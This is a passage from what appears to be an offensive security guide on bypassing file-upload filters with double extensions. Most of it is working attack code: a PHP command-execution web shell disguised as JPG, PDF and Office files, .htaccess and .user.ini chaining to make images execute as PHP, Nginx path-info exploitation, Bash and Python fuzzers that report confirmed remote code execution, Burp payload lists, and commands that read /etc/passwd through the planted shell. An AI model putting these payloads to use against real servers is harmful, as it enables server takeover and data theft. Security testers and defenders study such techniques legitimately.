Content-Disposition: form-data; name="file"; filename="/uploads/shell.php.jpg"
Content-Disposition: form-data; name="file"; filename="uploads/shell.php.jpg"
Content-Disposition: form-data; name="file"; filename="./shell.php.jpg"

# === Newline injection in Content-Disposition ===
Content-Disposition: form-data; name="file"; filename="shell.php.jpg
"
Content-Disposition: form-data; name="file"; filename="shell.php
.jpg"

# === Tab/space injection ===
Content-Disposition: form-data; name="file"; filename="shell.php\t.jpg"
Content-Disposition: form-data; name="file"; filename="shell.php .jpg"
Content-Disposition: form-data; name="file"; filename=" shell.php.jpg"
Content-Disposition: form-data; name="file"; filename="shell.php.jpg "

# === Extra parameters ===
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"; size="1234"
Content-Disposition: form-data; name="file"; dummy="shell.php"; filename="safe.jpg"
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"; creation-date="2024-01-01"

# === Python Script for Automated Content-Disposition Fuzzing ===
python3 << 'CDEOF'
import socket
import ssl

host = "target.com"
port = 443
cookie = "session=YOUR_SESSION"
boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"

dispositions = [
    'form-data; name="file"; filename="shell.php.jpg"',
    'form-data; name="file"; filename="safe.jpg"; filename="shell.php.jpg"',
    'form-data; name="file"; filename="shell.php.jpg"; filename="safe.jpg"',
    "form-data; name=\"file\"; filename='shell.php.jpg'",
    "form-data; name=\"file\"; filename=shell.php.jpg",
    'form-data; name="file"; filename*=UTF-8\'\'shell.php.jpg',
    'form-data; name="file"; filename="safe.jpg"; filename*=UTF-8\'\'shell.php.jpg',
    'form-data; name="file"; filename="shell.php.jpg"; dummy="test"',
]

shell_content = '<?php echo md5("cd_fuzz"); ?>'

for i, cd in enumerate(dispositions):
    body = f"--{boundary}\r\n"
    body += f"Content-Disposition: {cd}\r\n"
    body += "Content-Type: image/jpeg\r\n\r\n"
    body += f"{shell_content}\r\n"
    body += f"--{boundary}--\r\n"

    request = f"POST /upload HTTP/1.1\r\n"
    request += f"Host: {host}\r\n"
    request += f"Cookie: {cookie}\r\n"
    request += f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    request += f"Content-Length: {len(body)}\r\n"
    request += f"Connection: close\r\n\r\n"
    request += body

    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssock = context.wrap_socket(sock, server_hostname=host)
        ssock.connect((host, port))
        ssock.send(request.encode())
        
        response = b""
        while True:
            data = ssock.recv(4096)
            if not data:
                break
            response += data
        ssock.close()
        
        status_line = response.split(b'\r\n')[0].decode()
        print(f"[{i+1}] {cd[:60]}... → {status_line}")
    except Exception as e:
        print(f"[{i+1}] ERROR: {e}")
CDEOF
```
::

---

## Double Extension + .htaccess Chaining

::caution
This is a two-step attack. First upload a `.htaccess` file to enable execution of image extensions, then upload a shell with a double extension.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label=".htaccess + Double Ext Chain"}
  ```bash
  # === Step 1: Upload .htaccess ===
  # This makes .jpg files execute as PHP in the uploads directory

  # Payload Option A: AddType
  echo 'AddType application/x-httpd-php .jpg .png .gif' > .htaccess
  curl -X POST https://target.com/upload \
    -F "file=@.htaccess;type=text/plain" -b "session=COOKIE" -v

  # Payload Option B: AddHandler
  echo 'AddHandler application/x-httpd-php .jpg' > .htaccess
  curl -X POST https://target.com/upload \
    -F "file=@.htaccess;type=text/plain" -b "session=COOKIE" -v

  # Payload Option C: SetHandler for all files
  echo 'SetHandler application/x-httpd-php' > .htaccess
  curl -X POST https://target.com/upload \
    -F "file=@.htaccess;type=text/plain" -b "session=COOKIE" -v

  # Payload Option D: FilesMatch for double extensions
  cat > .htaccess << 'EOF'
  <FilesMatch "\.php\.">
    SetHandler application/x-httpd-php
  </FilesMatch>
  EOF
  curl -X POST https://target.com/upload \
    -F "file=@.htaccess;type=text/plain" -b "session=COOKIE"

  # Payload Option E: Make a custom extension executable
  cat > .htaccess << 'EOF'
  AddType application/x-httpd-php .evil
  AddType application/x-httpd-php .data
  AddType application/x-httpd-php .log
  EOF

  # === Step 2: Upload PHP Shell with Double Extension ===
  echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.jpg;type=image/jpeg" -b "session=COOKIE"

  # === Step 3: Execute ===
  curl "https://target.com/uploads/shell.php.jpg?cmd=id"
  curl "https://target.com/uploads/shell.php.jpg?cmd=whoami"
  curl "https://target.com/uploads/shell.php.jpg?cmd=cat+/etc/passwd"

  # === If .htaccess Upload is Blocked ===
  # Try alternative names that Apache still reads:
  # .htaccess is the default, but AccessFileName directive can change it

  # Try uploading as .htaccess with double extension
  curl -X POST https://target.com/upload \
    -F 'file=@.htaccess;filename=.htaccess.jpg' -b "session=COOKIE"

  # Try with path traversal to parent directory
  curl -X POST https://target.com/upload \
    -F 'file=@.htaccess;filename=../.htaccess' -b "session=COOKIE"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label=".user.ini + Double Ext Chain"}
  ```bash
  # === .user.ini Works with PHP-FPM/FastCGI (Not mod_php) ===
  # .user.ini is checked per-directory and auto-prepends PHP files

  # Step 1: Upload .user.ini
  echo 'auto_prepend_file=shell.php.jpg' > .user.ini
  curl -X POST https://target.com/upload \
    -F "file=@.user.ini;type=text/plain" -b "session=COOKIE"

  # Step 2: Upload shell with double extension
  echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.jpg;type=image/jpeg" -b "session=COOKIE"

  # Step 3: Access ANY .php file in the same directory
  # The shell.php.jpg content is prepended to every PHP execution
  curl "https://target.com/uploads/index.php?cmd=id"
  # Or if there's no PHP file in uploads, try:
  curl "https://target.com/uploads/?cmd=id"

  # === .user.ini with base64 encoded shell ===
  # Encode shell as base64
  echo -n '<?php system($_GET["cmd"]); ?>' | base64
  # Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

  # Upload base64 shell with double extension
  echo 'PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+' > shell.php.jpg
  
  # Upload .user.ini that decodes and includes it
  echo 'auto_prepend_file=php://filter/convert.base64-decode/resource=shell.php.jpg' > .user.ini
  curl -X POST https://target.com/upload \
    -F "file=@.user.ini" -b "session=COOKIE"
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.jpg;type=image/jpeg" -b "session=COOKIE"

  # Note: .user.ini changes take effect after PHP's user_ini.cache_ttl
  # Default: 300 seconds (5 minutes)
  # May need to wait up to 5 minutes for .user.ini to take effect
  ```
  :::
::

---

## Automated Double Extension Fuzzing

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Comprehensive Bash Fuzzer"}
  ```bash
  #!/bin/bash
  # === Double Extension Bypass Fuzzer ===
  # Usage: ./double_ext_fuzz.sh <upload_url> <session_cookie> [field_name]

  TARGET="${1:?Usage: $0 <upload_url> <session_cookie> [field_name]}"
  COOKIE="${2:?Provide session cookie}"
  FIELD="${3:-file}"

  SHELL_CONTENT='<?php echo md5("double_extension_bypass_confirmed"); ?>'
  EXPECTED_HASH=$(echo -n "double_extension_bypass_confirmed" | md5sum | cut -d' ' -f1)

  UPLOADED=()
  EXECUTED=()

  echo "================================================"
  echo "  Double Extension Bypass Fuzzer"
  echo "  Target: $TARGET"
  echo "  Expected hash: $EXPECTED_HASH"
  echo "================================================"

  # PHP executable extensions
  PHP_EXTS="php php3 php4 php5 php7 php8 pht phtml phar phps pgif pht7"

  # Safe/image extensions
  SAFE_EXTS="jpg jpeg png gif bmp webp ico tiff svg pdf txt doc csv xml json zip"

  # Unknown extensions for fallback
  UNKNOWN_EXTS="xyz abc xxx fakext qwz zyx aaa bbb zzz 123 test blah notreal"

  echo ""
  echo "[*] Phase 1: Forward Double Extensions (exec.safe)"
  echo "---------------------------------------------------"
  for exec_ext in $PHP_EXTS; do
    for safe_ext in $SAFE_EXTS; do
      FILENAME="test.$exec_ext.$safe_ext"
      echo "$SHELL_CONTENT" > "$FILENAME"
      STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET" \
        -F "$FIELD=@$FILENAME;type=image/jpeg" -b "$COOKIE" 2>/dev/null)
      if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
        echo "  [+] UPLOADED: $FILENAME (HTTP $STATUS)"
        UPLOADED+=("$FILENAME")
      fi
      rm -f "$FILENAME"
    done
  done

  echo ""
  echo "[*] Phase 2: Reverse Double Extensions (safe.exec)"
  echo "---------------------------------------------------"
  for safe_ext in jpg png gif; do
    for exec_ext in $PHP_EXTS; do
      FILENAME="test.$safe_ext.$exec_ext"
      echo "$SHELL_CONTENT" > "$FILENAME"
      STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET" \
        -F "$FIELD=@$FILENAME;type=image/jpeg" -b "$COOKIE" 2>/dev/null)
      if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
        echo "  [+] UPLOADED: $FILENAME (HTTP $STATUS)"
        UPLOADED+=("$FILENAME")
      fi
      rm -f "$FILENAME"
    done
  done

  echo ""
  echo "[*] Phase 3: Unknown Extension Fallback (exec.unknown)"
  echo "------------------------------------------------------"
  for exec_ext in $PHP_EXTS; do
    for unk_ext in $UNKNOWN_EXTS; do
      FILENAME="test.$exec_ext.$unk_ext"
      echo "$SHELL_CONTENT" > "$FILENAME"
      STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET" \
        -F "$FIELD=@$FILENAME;type=application/octet-stream" -b "$COOKIE" 2>/dev/null)
      if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
        echo "  [+] UPLOADED: $FILENAME (HTTP $STATUS)"
        UPLOADED+=("$FILENAME")
      fi
      rm -f "$FILENAME"
    done
  done

  echo ""
  echo "[*] Phase 4: Case Variation Double Extensions"
  echo "----------------------------------------------"
  CASE_EXTS="PHP Php pHp phP PHp pHP PhP PHTML Phtml pHtMl PHAR Phar"
  for case_ext in $CASE_EXTS; do
    for safe_ext in jpg png gif; do
      FILENAME="test.$case_ext.$safe_ext"
      echo "$SHELL_CONTENT" > "$FILENAME"
      STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET" \
        -F "$FIELD=@$FILENAME;type=image/jpeg" -b "$COOKIE" 2>/dev/null)
      if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
        echo "  [+] UPLOADED: $FILENAME (HTTP $STATUS)"
        UPLOADED+=("$FILENAME")
      fi
      rm -f "$FILENAME"
    done
  done

  echo ""
  echo "[*] Phase 5: Special Character Double Extensions"
  echo "-------------------------------------------------"
  SPECIAL_NAMES=(
    "test.php%00.jpg"
    "test.php%20.jpg"
    "test.php%0a.jpg"
    "test.php..jpg"
    "test.php.jpg."
    "test.php .jpg"
    "test.php;.jpg"
  )
  for sname in "${SPECIAL_NAMES[@]}"; do
    echo "$SHELL_CONTENT" > /tmp/special_shell
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET" \
      -F "$FIELD=@/tmp/special_shell;filename=$sname;type=image/jpeg" -b "$COOKIE" 2>/dev/null)
    if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
      echo "  [+] UPLOADED: $sname (HTTP $STATUS)"
      UPLOADED+=("$sname")
    fi
  done

  echo ""
  echo "================================================"
  echo "  RESULTS SUMMARY"
  echo "  Total uploaded: ${#UPLOADED[@]}"
  echo "================================================"
  for u in "${UPLOADED[@]}"; do
    echo "  → $u"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python Advanced Fuzzer"}
  ```python
  #!/usr/bin/env python3
  """
  Advanced Double Extension Bypass Fuzzer
  
  Usage:
    python3 double_ext_fuzzer.py \
      --url https://target.com/upload \
      --cookie "session=abc123" \
      --field file \
      --upload-dir https://target.com/uploads/
  """

  import requests
  import itertools
  import argparse
  import hashlib
  import time
  import sys
  import io
  import urllib3
  urllib3.disable_warnings()

  class DoubleExtFuzzer:
      def __init__(self, url, cookie, field="file", upload_dir=None, proxy=None):
          self.url = url
          self.field = field
          self.upload_dir = upload_dir
          self.session = requests.Session()
          self.session.verify = False
          
          # Parse cookies
          for c in cookie.split(";"):
              if "=" in c:
                  k, v = c.strip().split("=", 1)
                  self.session.cookies.set(k, v)
          
          if proxy:
              self.session.proxies = {"http": proxy, "https": proxy}
          
          self.marker = "double_ext_" + str(int(time.time()))
          self.expected_hash = hashlib.md5(self.marker.encode()).hexdigest()
          self.shell = f'<?php echo md5("{self.marker}"); ?>'.encode()
          
          self.results = {"uploaded": [], "executed": [], "blocked": []}

      def upload(self, filename, content=None, mime="image/jpeg"):
          if content is None:
              content = self.shell
          files = {self.field: (filename, io.BytesIO(content), mime)}
          try:
              r = self.session.post(self.url, files=files, timeout=10)
              return r.status_code, r.text
          except Exception as e:
              return 0, str(e)

      def check_execution(self, filename):
          if not self.upload_dir:
              return False
          try:
              url = self.upload_dir.rstrip("/") + "/" + filename
              r = self.session.get(url, timeout=5)
              return self.expected_hash in r.text
          except:
              return False

      def test(self, filename, content=None, mime="image/jpeg", category=""):
          status, body = self.upload(filename, content, mime)
          uploaded = status in [200, 201, 204] and "error" not in body.lower()[:200]
          
          if uploaded:
              self.results["uploaded"].append(filename)
              executed = self.check_execution(filename)
              if executed:
                  self.results["executed"].append(filename)
                  print(f"  [!!!RCE!!!] {filename} → EXECUTES! ({category})")
              else:
                  print(f"  [UPLOADED]  {filename} → HTTP {status} ({category})")
          else:
              self.results["blocked"].append(filename)
              # Only print blocked in verbose mode
              # print(f"  [BLOCKED]   {filename} → HTTP {status}")
          
          return uploaded

      def run(self):
          exec_exts = ['php','php3','php4','php5','php7','php8','pht','phtml','phar','phps','pgif']
          safe_exts = ['jpg','jpeg','png','gif','bmp','webp','ico','pdf','txt']
          unknown_exts = ['xyz','abc','xxx','fakext','test','blah','zzz','123','qwz','notreal']
          
          total_tests = 0
          
          # --- Phase 1: Forward Double Extensions ---
          print("\n[Phase 1] Forward Double Extensions (exec.safe)")
          print("-" * 55)
          for e in exec_exts:
              for s in safe_exts:
                  self.test(f"test.{e}.{s}", category="forward")
                  total_tests += 1

          # --- Phase 2: Reverse Double Extensions ---
          print("\n[Phase 2] Reverse Double Extensions (safe.exec)")
          print("-" * 55)
          for s in ['jpg','png','gif']:
              for e in exec_exts:
                  self.test(f"test.{s}.{e}", category="reverse")
                  total_tests += 1

          # --- Phase 3: Unknown Extension Fallback ---
          print("\n[Phase 3] Unknown Extension Fallback")
          print("-" * 55)
          for e in exec_exts:
              for u in unknown_exts:
                  self.test(f"test.{e}.{u}", mime="application/octet-stream", category="unknown")
                  total_tests += 1

          # --- Phase 4: Case Permutations ---
          print("\n[Phase 4] Case Variation Double Extensions")
          print("-" * 55)
          for combo in itertools.product(*[(c.lower(), c.upper()) for c in 'php']):
              case_ext = ''.join(combo)
              if case_ext == 'php':
                  continue  # Already tested
              for s in ['jpg','png','gif']:
                  self.test(f"test.{case_ext}.{s}", category="case")
                  total_tests += 1

          # --- Phase 5: Triple Extensions ---
          print("\n[Phase 5] Triple Extensions")
          print("-" * 55)
          triples = [
              ('php','jpg','png'), ('php','gif','jpg'), ('php','xyz','jpg'),
              ('jpg','php','png'), ('png','php','gif'), ('jpg','png','php'),
              ('php','abc','xyz'), ('phtml','jpg','png'), ('phar','gif','jpg'),
          ]
          for t in triples:
              self.test(f"test.{t[0]}.{t[1]}.{t[2]}", category="triple")
              total_tests += 1

          # --- Phase 6: Special Characters ---
          print("\n[Phase 6] Special Character Double Extensions")
          print("-" * 55)
          special = [
              ("test.php\x00.jpg", "null_byte"),
              ("test.php .jpg", "space"),
              ("test.php..jpg", "double_dot"),
              ("test.php.jpg.", "trailing_dot"),
              ("test.php.jpg ", "trailing_space"),
              (".test.php.jpg", "leading_dot"),
              ("test.php;.jpg", "semicolon"),
              ("test.php\t.jpg", "tab"),
          ]
          for filename, desc in special:
              self.test(filename, category=f"special:{desc}")
              total_tests += 1

          # --- Phase 7: Magic Bytes + Double Extension ---
          print("\n[Phase 7] Magic Bytes + Double Extension")
          print("-" * 55)
          magic = {
              'gif': b'GIF89a\n',
              'jpg': b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01',
              'png': b'\x89PNG\r\n\x1a\n',
              'bmp': b'BM',
          }
          for img, header in magic.items():
              content = header + self.shell
              for e in ['php','phtml','phar','php5']:
                  self.test(f"test.{e}.{img}", content=content, 
                           mime=f"image/{img}", category=f"magic:{img}")
                  total_tests += 1

          # --- Summary ---
          print("\n" + "=" * 60)
          print(f"  FUZZING COMPLETE")
          print(f"  Total tests:    {total_tests}")
          print(f"  Uploaded:       {len(self.results['uploaded'])}")
          print(f"  EXECUTED (RCE): {len(self.results['executed'])}")
          print(f"  Blocked:        {len(self.results['blocked'])}")
          print("=" * 60)
          
          if self.results['executed']:
              print("\n  🔥 RCE CONFIRMED WITH:")
              for f in self.results['executed']:
                  print(f"    → {f}")
          
          if self.results['uploaded'] and not self.results['executed']:
              print("\n  📁 Uploaded but not confirmed executing:")
              for f in self.results['uploaded'][:20]:
                  print(f"    → {f}")
              if len(self.results['uploaded']) > 20:
                  print(f"    ... and {len(self.results['uploaded'])-20} more")

  if __name__ == "__main__":
      parser = argparse.ArgumentParser(description="Double Extension Bypass Fuzzer")
      parser.add_argument("--url", "-u", required=True, help="Upload endpoint URL")
      parser.add_argument("--cookie", "-c", required=True, help="Session cookie")
      parser.add_argument("--field", "-f", default="file", help="Form field name")
      parser.add_argument("--upload-dir", "-d", default=None, help="Upload directory URL")
      parser.add_argument("--proxy", "-p", default=None, help="Proxy URL")
      args = parser.parse_args()

      fuzzer = DoubleExtFuzzer(args.url, args.cookie, args.field, args.upload_dir, args.proxy)
      fuzzer.run()
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Burp Intruder Setup"}
  ```
  # === Burp Suite Intruder Configuration for Double Extension Fuzzing ===

  # Step 1: Capture upload request in Proxy
  # Step 2: Send to Intruder (Ctrl+I)
  # Step 3: Set attack type to "Cluster Bomb"

  # Step 4: Mark two payload positions in filename:
  # Content-Disposition: form-data; name="file"; filename="test.§php§.§jpg§"

  # Step 5: Payload Set 1 (Executable extensions):
  php
  php3
  php4
  php5
  php7
  php8
  pht
  phtml
  phar
  phps
  pgif
  PHP
  Php
  pHp
  PhP
  pHP
  PHTML
  Phtml
  PHAR

  # Step 6: Payload Set 2 (Safe/decoy extensions):
  jpg
  jpeg
  png
  gif
  bmp
  webp
  ico
  pdf
  txt
  doc
  csv
  xyz
  abc
  xxx
  fakext
  test
  blah

  # Step 7: Configure Grep - Match
  # Add match string for success indicators:
  # - "uploaded"
  # - "success"
  # - File URL pattern

  # Step 8: Configure Grep - Extract
  # Extract uploaded file path from response

  # Step 9: Start attack
  # Review results — filter by HTTP 200 responses
  # Check which combinations were accepted

  # === Alternative: Single Payload with Full Filenames ===
  # Attack type: Sniper
  # Position: filename="§test.php.jpg§"
  # Payload list:
  test.php.jpg
  test.php.png
  test.php.gif
  test.php.xyz
  test.php3.jpg
  test.php5.jpg
  test.phtml.jpg
  test.phar.jpg
  test.PHP.jpg
  test.Php.jpg
  test.pHp.jpg
  test.jpg.php
  test.png.php
  test.gif.php
  test.php.jpg.png
  test.jpg.php.png
  test.php..jpg
  test.php.jpg.
  test.php%00.jpg
  test.php%20.jpg
  ```
  :::
::

---

## Nginx Path-Based Double Extension

Nginx has a specific vulnerability class where the double extension is not in the filename itself but in the **URL path** used to access the uploaded file.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Nginx + PHP-FPM Path Info"}
  ```bash
  # === The Vulnerability ===
  # When cgi.fix_pathinfo=1 (default in many PHP installations)
  # AND Nginx has a misconfigured location block:
  # 
  # location ~ \.php$ {
  #     fastcgi_pass 127.0.0.1:9000;
  #     ...
  # }
  #
  # PHP-FPM receives: /uploads/avatar.jpg/x.php
  # PHP-FPM logic:
  #   1. Check if /uploads/avatar.jpg/x.php exists → No
  #   2. Strip last path component: /uploads/avatar.jpg
  #   3. Check if /uploads/avatar.jpg exists → Yes
  #   4. Execute /uploads/avatar.jpg as PHP!

  # === Step 1: Upload a normal image with PHP code inside ===
  # Embed PHP in EXIF or use magic bytes
  printf 'GIF89a<?php system($_GET["cmd"]); ?>' > avatar.gif
  curl -X POST https://target.com/upload \
    -F "file=@avatar.gif;type=image/gif" -b "session=COOKIE"

  # File is saved as: /uploads/avatar.gif (accepted as valid image)

  # === Step 2: Access with .php appended to path ===
  curl "https://target.com/uploads/avatar.gif/nonexistent.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif/.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif/x.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif/anything.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif%00.php?cmd=id"

  # === Variations to Try ===
  # Different PHP path suffixes
  curl "https://target.com/uploads/avatar.gif/a.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif/test.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif/index.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif/info.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif/1.php?cmd=id"

  # Different image extensions
  curl "https://target.com/uploads/avatar.jpg/x.php?cmd=id"
  curl "https://target.com/uploads/avatar.png/x.php?cmd=id"
  curl "https://target.com/uploads/document.pdf/x.php?cmd=id"

  # === Detect the Vulnerability Without Upload ===
  # Test against any existing file on the server
  curl -sI "https://target.com/images/logo.png/test.php"
  # If HTTP 200 → Vulnerable (even if no PHP output)
  # If HTTP 404 → Not vulnerable (Nginx properly rejects)

  # Automated detection
  PATHS=$(curl -s https://target.com | grep -oP 'src="[^"]*\.(jpg|png|gif|jpeg|svg|ico)"' | cut -d'"' -f2 | head -10)
  for path in $PATHS; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" "https://target.com${path}/test.php" 2>/dev/null)
    echo "$path/test.php → HTTP $STATUS"
    if [ "$STATUS" != "404" ]; then
      echo "  [!] POTENTIALLY VULNERABLE!"
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Nginx Path Detection Script"}
  ```bash
  #!/bin/bash
  # === Nginx PHP Path Info Vulnerability Detector ===
  # Tests if target is vulnerable to path-based PHP execution
  
  TARGET="${1:?Usage: $0 <target_url>}"
  
  echo "=== Nginx PHP Path Info Detector ==="
  echo "Target: $TARGET"
  echo ""
  
  # Phase 1: Find existing static files
  echo "[*] Finding static files on target..."
  STATIC_FILES=$(curl -s "$TARGET" | \
    grep -oP '(href|src|action)="(/[^"]*\.(jpg|jpeg|png|gif|ico|css|js|svg|pdf|txt))"' | \
    grep -oP '/[^"]*' | sort -u | head -20)
  
  if [ -z "$STATIC_FILES" ]; then
    echo "[-] No static files found. Testing common paths..."
    STATIC_FILES="/favicon.ico /robots.txt /sitemap.xml"
  fi
  
  echo "[*] Testing path info vulnerability..."
  VULNERABLE=false
  
  for file in $STATIC_FILES; do
    # Test 1: Append /test.php
    STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET}${file}/test.php" 2>/dev/null)
    if [ "$STATUS" != "404" ] && [ "$STATUS" != "400" ] && [ "$STATUS" != "000" ]; then
      echo "[!] ${file}/test.php → HTTP $STATUS (POTENTIALLY VULNERABLE)"
      VULNERABLE=true
    fi
    
    # Test 2: Append /.php
    STATUS=$(curl -so /dev/null -w "%{http_code}" "${TARGET}${file}/.php" 2>/dev/null)
    if [ "$STATUS" != "404" ] && [ "$STATUS" != "400" ] && [ "$STATUS" != "000" ]; then
      echo "[!] ${file}/.php → HTTP $STATUS (POTENTIALLY VULNERABLE)"
      VULNERABLE=true
    fi
  done
  
  echo ""
  if [ "$VULNERABLE" = true ]; then
    echo "[+] Target appears VULNERABLE to Nginx PHP path info!"
    echo "[+] Next step: Upload image with embedded PHP and access via:"
    echo "    ${TARGET}/uploads/your_image.gif/x.php?cmd=id"
  else
    echo "[-] Target does not appear vulnerable to Nginx PHP path info."
  fi
  ```
  :::
::

---

## Double Extension in Different Contexts

::accordion
  :::accordion-item{icon="i-lucide-image" label="Avatar/Profile Picture Upload"}
  ```bash
  # Profile picture uploads often have weaker validation
  # They may only check if the file "looks like an image"

  # Step 1: Create a valid image with PHP in EXIF + double extension
  python3 -c "
  from PIL import Image
  img = Image.new('RGB', (200, 200), color='blue')
  img.save('avatar_clean.jpg')
  "
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' avatar_clean.jpg
  cp avatar_clean.jpg avatar.php.jpg

  # Step 2: Upload as avatar
  curl -X POST https://target.com/api/user/avatar \
    -F "avatar=@avatar.php.jpg;type=image/jpeg" \
    -b "session=COOKIE" -v

  # Step 3: Find where avatar is stored
  # Check profile page source for avatar URL
  curl -s https://target.com/profile | grep -oP 'src="[^"]*avatar[^"]*"'

  # Step 4: Access uploaded avatar
  curl "https://target.com/avatars/avatar.php.jpg?cmd=id"

  # Common avatar upload endpoints
  POST /api/v1/users/avatar
  POST /api/profile/photo
  POST /user/settings/avatar
  POST /account/picture
  PUT /api/users/me/avatar
  PATCH /api/profile/image
  ```
  :::

  :::accordion-item{icon="i-lucide-file-text" label="Document/Resume Upload"}
  ```bash
  # Document uploads (resume, CV, attachments) often allow more extensions
  # But may still block .php — double extension bypasses this

  # PHP shell as "resume"
  echo '<?php system($_GET["cmd"]); ?>' > resume.php.pdf
  printf '%%PDF-1.4\n<?php system($_GET["cmd"]); ?>\n%%%%EOF' > resume.php.pdf

  curl -X POST https://target.com/careers/apply \
    -F "resume=@resume.php.pdf;type=application/pdf" \
    -F "name=John Doe" \
    -F "email=test@test.com" \
    -b "session=COOKIE"

  # Document with double extension
  echo '<?php system($_GET["cmd"]); ?>' > document.php.doc
  echo '<?php system($_GET["cmd"]); ?>' > report.php.xlsx
  echo '<?php system($_GET["cmd"]); ?>' > presentation.php.pptx

  # Common document upload endpoints
  POST /api/documents/upload
  POST /support/ticket/attachment
  POST /hr/resume/upload
  POST /forms/submit (with file attachment)
  ```
  :::

  :::accordion-item{icon="i-lucide-message-square" label="Rich Text Editor Upload (CKEditor/TinyMCE)"}
  ```bash
  # CKEditor and TinyMCE have their own upload handlers
  # These are common targets for double extension attacks

  # === CKEditor Upload Endpoints ===
  # CKEditor 4
  POST /ckeditor/upload
  POST /admin/ckeditor/upload
  POST /ckeditor/connector
  POST /ckfinder/connector

  # Test double extension on CKEditor
  echo '<?php system($_GET["cmd"]); ?>' > image.php.png
  curl -X POST "https://target.com/ckeditor/upload?CKEditorFuncNum=1&langCode=en" \
    -F "upload=@image.php.png;type=image/png" \
    -b "session=COOKIE"

  # === TinyMCE Upload Endpoints ===
  POST /tinymce/upload
  POST /admin/tinymce/upload
  POST /api/tinymce/upload

  curl -X POST "https://target.com/tinymce/upload" \
    -F "file=@image.php.jpg;type=image/jpeg" \
    -b "session=COOKIE"

  # === ElFinder (File Manager) ===
  POST /elfinder/connector
  POST /admin/elfinder/connector

  curl -X POST "https://target.com/elfinder/connector" \
    -F "cmd=upload" \
    -F "target=l1_Lw" \
    -F "upload[]=@shell.php.jpg;type=image/jpeg" \
    -b "session=COOKIE"
  ```
  :::

  :::accordion-item{icon="i-lucide-cloud" label="API Upload Endpoints"}
  ```bash
  # REST API uploads often use different field names and validation

  # === JSON-based upload with base64 ===
  # Some APIs accept base64-encoded files in JSON
  SHELL_B64=$(echo -n '<?php system($_GET["cmd"]); ?>' | base64)
  
  curl -X POST https://target.com/api/v1/files \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -d "{
      \"filename\": \"report.php.jpg\",
      \"content\": \"$SHELL_B64\",
      \"content_type\": \"image/jpeg\"
    }"

  # === Multipart API upload ===
  curl -X POST https://target.com/api/v2/upload \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -F "file=@shell.php.png;type=image/png" \
    -F "path=/uploads/" \
    -F "overwrite=true"

  # === PUT-based upload ===
  curl -X PUT "https://target.com/api/files/shell.php.jpg" \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -H "Content-Type: image/jpeg" \
    -d '<?php system($_GET["cmd"]); ?>'

  # === Presigned URL upload (S3-style) ===
  # Step 1: Get presigned URL
  PRESIGNED=$(curl -s "https://target.com/api/upload/presign?filename=shell.php.jpg" \
    -H "Authorization: Bearer YOUR_TOKEN" | jq -r '.url')
  
  # Step 2: Upload directly to storage
  curl -X PUT "$PRESIGNED" \
    -H "Content-Type: image/jpeg" \
    -d '<?php system($_GET["cmd"]); ?>'

  # === GraphQL upload ===
  curl -X POST https://target.com/graphql \
    -F 'operations={"query":"mutation($file:Upload!){uploadFile(file:$file){url}}","variables":{"file":null}}' \
    -F 'map={"0":["variables.file"]}' \
    -F '0=@shell.php.jpg;type=image/jpeg'
  ```
  :::
::

---

## Verifying Execution After Upload

::steps{level="4"}

#### Locate the Uploaded File

```bash
# Check upload response for file path
curl -X POST https://target.com/upload \
  -F "file=@shell.php.jpg;type=image/jpeg" \
  -b "session=COOKIE" -v 2>&1 | grep -iE "url|path|location|filename|href|src"

# Parse JSON response
curl -s -X POST https://target.com/upload \
  -F "file=@shell.php.jpg;type=image/jpeg" \
  -b "session=COOKIE" | python3 -m json.tool

# Check common upload directories
for dir in uploads files media images static content assets data user_uploads documents; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "https://target.com/$dir/shell.php.jpg" 2>/dev/null)
  if [ "$STATUS" != "404" ] && [ "$STATUS" != "403" ]; then
    echo "[FOUND] https://target.com/$dir/shell.php.jpg → HTTP $STATUS"
  fi
done
```

#### Check Response Headers of Uploaded File

```bash
# Examine Content-Type of the uploaded file
